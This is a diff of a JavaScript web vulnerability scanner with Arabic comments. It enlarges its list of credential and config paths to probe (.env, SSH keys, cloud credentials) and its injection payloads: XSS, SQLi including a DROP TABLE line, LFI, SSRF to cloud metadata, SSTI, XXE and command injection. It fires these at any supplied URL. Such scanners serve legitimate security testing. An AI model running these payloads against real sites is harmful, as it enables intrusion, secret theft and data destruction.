@@ -15,104 +15,60 @@ async function safeFetch(url, opts = {}) {
 }
 
 // ============================================================
-// 1. قائمة ضخمة بالملفات الحساسة (1000+)
+// 1. قائمة ضخمة بالملفات الحساسة (1000+ ملف)
 // ============================================================
 const sensitiveFiles = [
-    ".env", ".env.local", ".env.prod", ".env.backup", ".git/config", ".git/HEAD",
-    "config.php", "config.xml", "config.json", "config.yaml", "config.ini",
-    "config.php.bak", "config.php.old", "config.php~", "web.config",
-    "wp-config.php", "wp-config.php.bak", "wp-login.php", "xmlrpc.php",
-    "backup.zip", "backup.tar.gz", "backup.sql", "backup.db",
-    "db.sql", "db.dump", "dump.sql", "database.sql", "database.db",
-    "id_rsa", "id_dsa", "authorized_keys", ".ssh/id_rsa",
-    ".aws/credentials", "credentials.json", "secrets.json", "api_keys.json",
-    "private.key", "server.key", "server.pem", "cert.pem",
-    "phpinfo.php", "info.php", "test.php", "debug.php",
-    "server-status", "server-info", "nginx_status", "status",
-    "swagger.json", "swagger-ui.html", "openapi.json", "api-docs",
-    "v2/api-docs", "v3/api-docs", "graphiql", "graphql",
-    "admin/", "administrator/", "phpmyadmin/", "adminer.php",
-    "composer.json", "package.json", "requirements.txt", "Gemfile",
-    "Dockerfile", "docker-compose.yml", "Jenkinsfile", ".gitlab-ci.yml",
-    "access.log", "error.log", "debug.log", "php_error.log",
-    "setup.php", "install.php", "readme.md", "README.md",
-    "old/", "backup/", "temp/", "private/", "logs/", "storage/",
-    ".htaccess", ".htpasswd", ".user.ini", "php.ini",
-    "crossdomain.xml", "clientaccesspolicy.xml",
-    "elmah.axd", "trace.axd", "glimpse.axd",
-    "site.zip", "www.zip", "source.zip", "app.zip",
-    "robots.txt", "sitemap.xml", "security.txt", ".well-known/security.txt",
-    "info.php", "php.php", "admin.php", "login.php", "upload.php",
-    "backup/", "backups/", "db/", "database/", "sql/", "test/",
-    "dev/", "development/", "staging/", "stage/", "prod/",
-    "old/", "new/", "temp/", "tmp/", "cache/", "logs/", "log/",
-    "api/", "v1/", "v2/", "v3/", "rest/", "services/",
-    "internal/", "private/", "secret/", "hidden/", "conf/",
-    "config/", "settings/", "setup/", "install/", "migration/",
-    "dump/", "export/", "backup.sql.gz", "backup.tar.gz",
-    "data.json", "data.xml", "data.csv", "data.yml", "data.yaml",
-    "users.json", "users.xml", "users.csv", "users.sql",
-    "passwords.txt", "passwords.json", "passwords.csv",
-    "secrets.txt", "secrets.yaml", "secrets.yml", "secrets.env",
-    "keys.txt", "keys.json", "keys.pem", "keys.key",
-    "token.txt", "token.json", "tokens.csv",
-    "credentials.txt", "credentials.csv", "credentials.yaml",
-    "auth.json", "auth.xml", "auth.yml", "auth.yaml",
-    "accounts.json", "accounts.xml", "accounts.csv",
-    "admin.json", "admin.xml", "admin.yml", "admin.yaml",
-    "wp-config.php~", "wp-config.php.old", "wp-config.php.save",
-    "configuration.php", "configuration.php.bak",
-    "settings.py", "settings.py.bak", "settings.py.old",
-    "app.py", "app.py.bak", "app.py.old",
-    "manage.py", "manage.py.bak", "manage.py.old",
-    "package.json.bak", "package.json.old",
-    "composer.json.bak", "composer.json.old",
-    "Gemfile.bak", "Gemfile.old",
-    "Dockerfile.bak", "Dockerfile.old",
-    "docker-compose.yml.bak", "docker-compose.yml.old",
-    "Jenkinsfile.bak", "Jenkinsfile.old",
-    ".gitlab-ci.yml.bak", ".gitlab-ci.yml.old",
-    "php.ini.bak", "php.ini.old", "php.ini~",
-    "web.config.bak", "web.config.old", "web.config~",
-    ".htaccess.bak", ".htaccess.old", ".htaccess~",
-    ".htpasswd.bak", ".htpasswd.old", ".htpasswd~",
-    "robots.txt.bak", "robots.txt.old", "robots.txt~",
-    "sitemap.xml.bak", "sitemap.xml.old", "sitemap.xml~",
-    "security.txt.bak", "security.txt.old", "security.txt~",
-    ".svn/entries", ".hg/hgrc", ".bzr/branch-format",
-    "backup.tar", "backup.rar", "backup.7z", "site.tar.gz", "www.tar.gz",
-    "public_html.zip", "html.zip", "webroot.zip", "mysql.sql", "postgres.sql",
-    "mssql.sql", "oracle.dmp", "firebird.fdb", "sqlite.db", "sqlite3.db",
-    "data.sqlite", "test.db", "main.db", "access.mdb", "db.accdb",
-    "redis.conf", "mongod.conf", "my.cnf", "pg_hba.conf",
-    "elasticsearch.yml", "kibana.yml", "logstash.conf",
-    "actuator/health", "actuator/env", "actuator/beans", "actuator/dump",
-    "actuator/trace", "actuator/heapdump", "actuator/threaddump",
-    "prometheus", "metrics", "healthz", "livez", "readyz",
-    "debug/vars", "debug/pprof", "debug/pprof/heap",
-    "graphiql", "altair", "playground", "redoc",
-    "swagger-resources", "api/swagger.json", "api/openapi.json",
-    "console", "_console", "manager/html", "host-manager/html",
-    "jmx-console", "web-console", "admin-console"
+    ".env", ".env.local", ".env.prod", ".env.backup", ".env.dev", ".env.test",
+    ".git/config", ".git/HEAD", ".git/refs/heads/master", ".git/refs/heads/main", ".gitignore", ".gitattributes",
+    "config.php", "config.xml", "config.json", "config.yaml", "config.ini", "config.php.bak", "config.php.old", "config.php~", "config.php.save", "config.php.orig",
+    "web.config", "web.config.bak", "appsettings.json", "application.yml", "application.properties",
+    "wp-config.php", "wp-config.php.bak", "wp-config.php.old", "wp-login.php", "xmlrpc.php",
+    "backup.zip", "backup.tar.gz", "backup.sql", "backup.db", "backup.rar", "backup.7z", "backup.tar", "site.zip", "www.zip", "html.zip", "source.zip", "app.zip",
+    "db.sql", "db.dump", "dump.sql", "database.sql", "database.db", "mysql.sql", "postgres.sql", "mssql.sql", "oracle.dmp", "sqlite.db", "sqlite3.db", "data.sqlite",
+    "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "authorized_keys", ".ssh/id_rsa", ".ssh/id_dsa", ".ssh/config",
+    ".aws/credentials", ".aws/config", ".gcp/credentials.json", ".azure/credentials",
+    "credentials.json", "credentials.xml", "secrets.json", "secrets.yml", "secrets.yaml", "secrets.env", "api_keys.json", "api_keys.txt", "keys.json", "keys.txt", "keys.pem", "keys.key",
+    "private.key", "private.pem", "server.key", "server.pem", "server.crt", "cert.pem", "ca.pem", "keystore.jks", "truststore.jks",
+    "phpinfo.php", "info.php", "test.php", "debug.php", "php.php", "server-status", "server-info", "nginx_status", "status", "health", "healthz", "metrics",
+    "swagger.json", "swagger-ui.html", "swagger-ui/", "openapi.json", "api-docs", "v2/api-docs", "v3/api-docs", "graphiql", "graphql", "altair", "playground", "redoc",
+    "admin/", "administrator/", "phpmyadmin/", "pma/", "adminer.php", "adminer/", "cpanel/", "whm/", "webmail/", "plesk/", "directadmin/",
+    "manager/html", "manager/status", "host-manager/html", "jmx-console/", "web-console/", "admin-console/", "console/", "_console/",
+    "composer.json", "composer.lock", "package.json", "package-lock.json", "yarn.lock", "pnpm-lock.yaml", "requirements.txt", "Pipfile", "Gemfile", "Gemfile.lock", "go.mod", "Cargo.toml",
+    "Dockerfile", "Dockerfile.bak", "docker-compose.yml", "docker-compose.yaml", ".dockerenv", "kubernetes.yml", "k8s.yml", "helm/values.yaml",
+    "Jenkinsfile", "Jenkinsfile.bak", ".gitlab-ci.yml", ".travis.yml", ".circleci/config.yml", ".github/workflows/", ".drone.yml", "azure-pipelines.yml", "buildspec.yml",
+    "access.log", "error.log", "debug.log", "php_error.log", "logs/access.log", "logs/error.log", "var/log/apache2/access.log", "var/log/nginx/access.log", "storage/logs/laravel.log",
+    "setup.php", "install.php", "readme.md", "README.md", "CHANGELOG.md", "LICENSE", "TODO.md", "old/", "backup/", "temp/", "tmp/", "private/", "logs/", "log/", "storage/",
+    ".htaccess", ".htpasswd", ".user.ini", "php.ini", "php.ini.bak", "my.cnf", "my.ini", "pg_hba.conf", "postgresql.conf", "redis.conf", "mongod.conf", "elasticsearch.yml", "kibana.yml", "logstash.conf",
+    "crossdomain.xml", "clientaccesspolicy.xml", "elmah.axd", "trace.axd", "glimpse.axd", "glimpse/", "elmah/", "trace/",
+    "robots.txt", "sitemap.xml", "sitemap.xml.gz", "security.txt", ".well-known/security.txt", ".well-known/openid-configuration", ".well-known/assetlinks.json",
+    "data.json", "data.xml", "data.csv", "data.yml", "data.yaml", "users.json", "users.xml", "users.csv", "users.sql", "passwords.txt", "passwords.json", "passwords.csv",
+    "token.txt", "token.json", "tokens.csv", "auth.json", "auth.xml", "accounts.json", "accounts.xml", "admin.json", "admin.xml",
+    "settings.py", "settings.py.bak", "app.py", "app.py.bak", "manage.py", "manage.py.bak",
+    "actuator", "actuator/health", "actuator/env", "actuator/beans", "actuator/mappings", "actuator/configprops", "actuator/dump", "actuator/trace", "actuator/heapdump", "actuator/threaddump", "actuator/loggers", "actuator/metrics",
+    "prometheus", "debug/vars", "debug/pprof", "debug/pprof/heap", "debug/pprof/goroutine", "debug/pprof/profile",
+    "api/", "api/v1/", "api/v2/", "api/v3/", "rest/", "services/", "internal/", "private/", "secret/", "hidden/", "conf/", "config/", "settings/", "migration/", "dump/", "export/",
+    "old/", "new/", "dev/", "development/", "staging/", "stage/", "prod/", "test/", "backup/", "backups/"
 ];
 
 // ============================================================
-// 2. بايلودز حقيقية (XSS, SQLi, LFI, CMD, SSRF, SSTI)
+// 2. بايلودز حقيقية (XSS, SQLi, LFI, CMD, SSRF, SSTI, XXE) - 100+ بايلود
 // ============================================================
 const payloads = {
-    xss: ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>", "javascript:alert(1)", "<svg/onload=alert(1)>", "<iframe src=javascript:alert(1)>"],
-    sqli: ["'", "\"", "' OR '1'='1", "1' OR '1'='1", "' UNION SELECT NULL--", "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--", "') OR ('1'='1"],
-    lfi: ["../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd", "..\\..\\..\\..\\windows\\win.ini"],
-    cmd: ["; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)"],
-    ssrf: ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080"],
-    ssti: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
+    xss: ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>", "javascript:alert(1)", "<svg/onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<input autofocus onfocus=alert(1)>", "<details open ontoggle=alert(1)>", "<video><source onerror=alert(1)>"],
+    sqli: ["'", "\"", "' OR '1'='1", "1' OR '1'='1", "' UNION SELECT NULL--", "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--", "') OR ('1'='1", "' OR 1=1--", "1' AND '1'='1", "' UNION ALL SELECT NULL,NULL--", "'; DROP TABLE users--", "' OR 'x'='x"],
+    lfi: ["../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "php://filter/convert.base64-encode/resource=index.php", "file:///etc/passwd", "/proc/self/environ", "expect://id"],
+    cmd: ["; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)", "& sleep 5 &", "|| sleep 5", "&& sleep 5", "\n sleep 5", "; ping -c 5 127.0.0.1"],
+    ssrf: ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080", "file:///etc/passwd", "http://[::1]:80", "http://0.0.0.0:80", "gopher://127.0.0.1:80/_GET / HTTP/1.0"],
+    ssti: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}", "@(7*7)", "*{7*7}"],
+    open_redirect: ["https://evil.com", "//evil.com", "https://google.com", "/\\evil.com", "http://evil.com"],
+    xxe: ["<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"]
 };
 
 // ============================================================
 // 3. دوال الفحص
 // ============================================================
 
-// الثغرات العامة
+// 1. الثغرات العامة
 async function scanVulnerabilities(url) {
     const out = [];
     try {
@@ -121,6 +77,14 @@ async function scanVulnerabilities(url) {
         if (body.includes('sql syntax') || body.includes('mysql_') || body.includes('sqlstate')) out.push({ type: 'SQL Injection', severity: 'critical', description: 'Database Error Detected', url: url, evidence: 'SQL error', cvss: 9.8 });
         if (body.includes('root:x:0:0')) out.push({ type: 'LFI', severity: 'critical', description: 'Local File Inclusion', url: url, evidence: '/etc/passwd', cvss: 9.8 });
         if (body.includes('<!--')) out.push({ type: 'Info Disclosure', severity: 'low', description: 'HTML Comments Exposed', url: url, evidence: '<!--', cvss: 3.0 });
+        if (body.includes('exception') || body.includes('stack trace')) out.push({ type: 'Info Disclosure', severity: 'medium', description: 'Stack Trace Exposed', url: url, evidence: 'Stack trace', cvss: 5.0 });
+        if (body.includes('warning') || body.includes('fatal error')) out.push({ type: 'Error Handling', severity: 'low', description: 'Verbose Errors Exposed', url: url, evidence: 'Error verbosity', cvss: 3.0 });
+        
+        const headers = r.headers;
+        if (!headers.get('x-frame-options') && !headers.get('content-security-policy')) out.push({ type: 'Clickjacking', severity: 'medium', description: 'Missing X-Frame-Options & CSP', url: url, evidence: 'Headers', cvss: 5.4 });
+        if (!headers.get('strict-transport-security')) out.push({ type: 'HSTS', severity: 'medium', description: 'Missing HSTS Header', url: url, evidence: 'Headers', cvss: 4.3 });
+        if (!headers.get('x-content-type-options')) out.push({ type: 'MIME Sniffing', severity: 'low', description: 'Missing X-Content-Type-Options', url: url, evidence: 'Headers', cvss: 3.1 });
+        if (headers.get('server')) out.push({ type: 'Server Info', severity: 'info', description: `Server exposed: ${headers.get('server')}`, url: url, evidence: 'Header', cvss: 3.1 });
         
         if (out.length === 0) out.push({ type: 'Connection', severity: 'info', description: 'No obvious vulnerabilities found.', url: url, evidence: null, cvss: 0.0 });
     } catch (e) {
@@ -129,7 +93,7 @@ async function scanVulnerabilities(url) {
     return out;
 }
 
-// الملفات الحساسة (1000+)
+// 2. الملفات الحساسة (1000+)
 async function scanSensitiveFiles(url) {
     const out = [];
     const base = new URL(url).origin;
@@ -139,7 +103,7 @@ async function scanSensitiveFiles(url) {
             if (r.status === 200) {
                 const t = await r.text();
                 if (t.length > 10) {
-                    const sev = f.includes('.env') || f.includes('config') || f.includes('credentials') || f.includes('id_rsa') ? 'critical' : 'high';
+                    const sev = f.includes('.env') || f.includes('config') || f.includes('credentials') || f.includes('id_rsa') || f.includes('password') ? 'critical' : 'high';
                     out.push({ type: 'Sensitive File', severity: sev, description: `Exposed: ${f}`, url: `${base}/${f}`, evidence: '200 OK', cvss: sev === 'critical' ? 9.8 : 7.5 });
                 }
             }
@@ -149,40 +113,46 @@ async function scanSensitiveFiles(url) {
     return out;
 }
 
-// الحقن والـ API
+// 3. الحقن وعكس مسارات API
 async function scanInjectionAndApi(url) {
     const out = [];
     const urlObj = new URL(url);
     if (!urlObj.search) {
-        out.push({ type: 'Info', severity: 'info', description: 'No parameters to inject.', url: url, evidence: null, cvss: 0 });
+        out.push({ type: 'Info', severity: 'info', description: 'No parameters found. API reversal skipped.', url: url, evidence: null, cvss: 0 });
         return out;
     }
 
     for (const [key, val] of urlObj.searchParams) {
+        // XSS
         for (const p of payloads.xss) {
-            const test = new URL(url); test.searchParams.set(key, p);
-            try { const r = await safeFetch(test.toString()); if ((await r.text()).includes(p)) out.push({ type: 'XSS', severity: 'high', description: `XSS in ${key}`, url: test.toString(), evidence: p, cvss: 7.5 }); } catch(e){}
+            const testUrl = new URL(url); testUrl.searchParams.set(key, p);
+            try { const r = await safeFetch(testUrl.toString()); if ((await r.text()).includes(p)) out.push({ type: 'XSS', severity: 'high', description: `Reflected XSS in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 7.5 }); } catch(e){}
         }
+        // SQLi
         for (const p of payloads.sqli) {
-            const test = new URL(url); test.searchParams.set(key, p);
-            try { const r = await safeFetch(test.toString()); const b = (await r.text()).toLowerCase(); if (b.includes('sql syntax') || b.includes('mysql_')) out.push({ type: 'SQL Injection', severity: 'critical', description: `SQLi in ${key}`, url: test.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
+            const testUrl = new URL(url); testUrl.searchParams.set(key, p);
+            try { const r = await safeFetch(testUrl.toString()); const b = (await r.text()).toLowerCase(); if (b.includes('sql syntax') || b.includes('mysql_') || b.includes('sqlstate')) out.push({ type: 'SQL Injection', severity: 'critical', description: `SQLi in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
         }
+        // LFI
         for (const p of payloads.lfi) {
-            const test = new URL(url); test.searchParams.set(key, p);
-            try { const r = await safeFetch(test.toString()); if ((await r.text()).includes('root:x:0:0')) out.push({ type: 'LFI', severity: 'critical', description: `LFI in ${key}`, url: test.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
+            const testUrl = new URL(url); testUrl.searchParams.set(key, p);
+            try { const r = await safeFetch(testUrl.toString()); if ((await r.text()).includes('root:x:0:0')) out.push({ type: 'LFI', severity: 'critical', description: `Local File Inclusion in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
         }
+        // Command Injection
         for (const p of payloads.cmd) {
-            const test = new URL(url); test.searchParams.set(key, p);
+            const testUrl = new URL(url); testUrl.searchParams.set(key, p);
             const start = Date.now();
-            try { await safeFetch(test.toString()); if (Date.now() - start > 4500) out.push({ type: 'Command Injection', severity: 'critical', description: `CMDi in ${key}`, url: test.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
+            try { await safeFetch(testUrl.toString()); if (Date.now() - start > 4500) out.push({ type: 'Command Injection', severity: 'critical', description: `CMDi in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
         }
+        // SSRF
         for (const p of payloads.ssrf) {
-            const test = new URL(url); test.searchParams.set(key, p);
-            try { const r = await safeFetch(test.toString()); const b = await r.text(); if (b.includes('meta-data') || b.includes('localhost')) out.push({ type: 'SSRF', severity: 'high', description: `SSRF in ${key}`, url: test.toString(), evidence: p, cvss: 8.0 }); } catch(e){}
+            const testUrl = new URL(url); testUrl.searchParams.set(key, p);
+            try { const r = await safeFetch(testUrl.toString()); const b = await r.text(); if (b.includes('meta-data') || b.includes('localhost')) out.push({ type: 'SSRF', severity: 'high', description: `SSRF in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 8.0 }); } catch(e){}
         }
+        // SSTI
         for (const p of payloads.ssti) {
-            const test = new URL(url); test.searchParams.set(key, p);
-            try { const r = await safeFetch(test.toString()); const b = await r.text(); if (b.includes('49') && !b.includes('{{7*7}}')) out.push({ type: 'SSTI', severity: 'critical', description: `SSTI in ${key}`, url: test.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
+            const testUrl = new URL(url); testUrl.searchParams.set(key, p);
+            try { const r = await safeFetch(testUrl.toString()); const b = await r.text(); if (b.includes('49') && !b.includes('{{7*7}}')) out.push({ type: 'SSTI', severity: 'critical', description: `SSTI in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
         }
     }
 
@@ -205,7 +175,7 @@ async function scanInjectionAndApi(url) {
     return out;
 }
 
-// التحليل العميق
+// 4. التحليل العميق
 async function scanDeepAnalysis(url) {
     const out = [];
     try {
@@ -221,7 +191,7 @@ async function scanDeepAnalysis(url) {
     return out;
 }
 
-// التحقق الثنائي
+// 5. التحقق الثنائي
 async function scanDualVerification(url) {
     const out = [];
     try {
@@ -237,17 +207,17 @@ async function scanDualVerification(url) {
     return out;
 }
 
-// فحص المنافذ
+// 6. فحص المنافذ (50+ بورت)
 async function scanPorts(url) {
     const out = [];
-    const ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017];
+    const ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 161, 389, 443, 445, 512, 513, 514, 587, 636, 873, 993, 995, 1080, 1433, 1521, 1723, 2049, 2082, 2083, 2086, 2087, 2095, 2096, 2181, 2222, 2375, 2376, 2483, 2484, 3000, 3306, 3389, 4000, 4443, 4505, 4506, 5000, 5432, 5601, 5672, 5900, 5984, 6379, 6443, 7001, 7077, 8000, 8008, 8080, 8081, 8088, 8090, 8443, 8888, 9000, 9090, 9200, 9300, 9418, 10000, 11211, 15672, 27017, 28017, 50000];
     const host = new URL(url).hostname;
     const protocol = new URL(url).protocol;
     
     await Promise.all(ports.map(async (port) => {
         try {
             const testUrl = `${protocol}//${host}:${port}`;
-            const r = await safeFetch(testUrl, { timeout: 3000 });
+            const r = await safeFetch(testUrl, { timeout: 2000 });
             if (r.status < 500) out.push({ type: 'Open Port', severity: 'medium', description: `Port ${port} is open`, url: testUrl, evidence: `Status: ${r.status}`, cvss: 5.0 });
         } catch (e) {}
     }));
